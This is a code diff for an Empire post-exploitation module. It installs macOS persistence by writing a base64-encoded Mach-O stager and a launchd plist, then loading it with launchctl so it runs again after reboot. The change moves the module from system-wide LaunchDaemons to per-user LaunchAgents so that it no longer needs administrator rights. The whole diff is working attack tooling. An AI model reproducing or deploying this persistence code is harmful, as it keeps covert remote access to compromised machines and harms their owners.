@@ -12,7 +12,7 @@ class Module:
             'Author': ['@xorrior'],
 
             # more verbose multi-line description of the module
-            'Description': ('Installs an Empire launchDaemon.'),
+            'Description': ('Installs an Empire LaunchDaemon.'),
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -21,7 +21,7 @@ class Module:
             'OutputExtension' : None,
 
             # if the module needs administrative privileges
-            'NeedsAdmin' : True,
+            'NeedsAdmin' : False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : False,
@@ -65,11 +65,6 @@ class Module:
                 'Description'   :   'Name of the Launch Daemon to install. Name will also be used for the plist file.',
                 'Required'      :   True,
                 'Value'         :   'com.proxy.initialize'
-            },
-            'DaemonLocation' : {
-                'Description'   :   'The full path of where the Empire launch daemon should be located.',
-                'Required'      :   True,
-                'Value'         :   ''
             }
         }
 
@@ -91,19 +86,18 @@ class Module:
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
         daemonName = self.options['DaemonName']['Value']
-        programname = self.options['DaemonLocation']['Value']
-        plistfilename = "%s.plist" % daemonName
+        programName = daemonName.split('.')[-1]
+        plistFilename = "%s.plist" % daemonName
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
-        launcher = launcher.strip('echo').strip(' | python &').strip("\"")
+        launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
         machoBytes = self.mainMenu.stagers.generate_macho(launcherCode=launcher)
         encBytes = base64.b64encode(machoBytes)
 
-        plistSettings = """
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0">
+        plistSettings = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0">
 <plist version="1.0">
 <dict>
     <key>Label</key>
@@ -117,8 +111,7 @@ class Module:
     <key>KeepAlive</key>
     <true/>
 </dict>
-</plist>
-""" % (daemonName, programname)
+</plist>"""
 
         script = """
 import subprocess
@@ -126,45 +119,45 @@ import sys
 import base64
 import os
 
-encBytes = "%s"
+isRoot = True if os.geteuid() == 0 else False
+user = os.environ['USER']
+group = 'wheel' if isRoot else 'staff'
+
+launchPath = '/Library/LaunchAgents/' if isRoot else '/Users/'+user+'/Library/LaunchAgents/'
+daemonPath = '/Library/Application Support/%(daemonName)s/' if isRoot else '/Users/'+user+'/Library/Application Support/%(daemonName)s/'
+
+encBytes = "%(encBytes)s"
 bytes = base64.b64decode(encBytes)
-plist = \"\"\"
-%s
-\"\"\"
-daemonPath = "%s"
+plist = \"\"\"%(plistSettings)s
+\"\"\" %% ('%(daemonName)s', daemonPath+'%(programName)s')
 
-if not os.path.exists(os.path.split(daemonPath)[0]):
-    os.makedirs(os.path.split(daemonPath)[0])
+if not os.path.exists(daemonPath):
+    os.makedirs(daemonPath)
 
-
-e = open(daemonPath,'wb')
+e = open(daemonPath+'%(programName)s','wb')
 e.write(bytes)
 e.close()
 
-os.chmod(daemonPath, 0777)
+os.chmod(daemonPath+'%(programName)s', 0755)
 
-f = open('/tmp/%s','w')
+f = open('/tmp/%(plistFilename)s','w')
 f.write(plist)
 f.close()
 
-process = subprocess.Popen('chmod 644 /tmp/%s', stdout=subprocess.PIPE, shell=True)
+os.chmod('/tmp/%(plistFilename)s', 0644)
+
+process = subprocess.Popen('chown '+user+':'+group+' /tmp/%(plistFilename)s', stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('chown -R root /tmp/%s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('mv /tmp/%(plistFilename)s '+launchPath+'%(plistFilename)s', stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('chown :wheel /tmp/%s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('launchctl load '+launchPath+'%(plistFilename)s', stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('mv /tmp/%s /Library/LaunchDaemons/%s', stdout=subprocess.PIPE, shell=True)
-process.communicate()
+print "\\n[+] Persistence has been installed: "+launchPath+"%(plistFilename)s"
+print "\\n[+] Empire daemon has been written to "+daemonPath+"%(programName)s"
 
-process = subprocess.Popen('launchctl load /Library/LaunchDaemons/%s', stdout=subprocess.PIPE, shell=True)
-process.communicate()
-
-print "\\n[+] Persistence has been installed: /Library/LaunchDaemons/%s"
-print "\\n[+] Empire daemon has been written to %s"
-
-""" % (encBytes,plistSettings, programname, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, programname)
+""" % {"encBytes":encBytes, "plistSettings":plistSettings, "daemonName":daemonName, "programName":programName, "plistFilename":plistFilename}
 
         return script
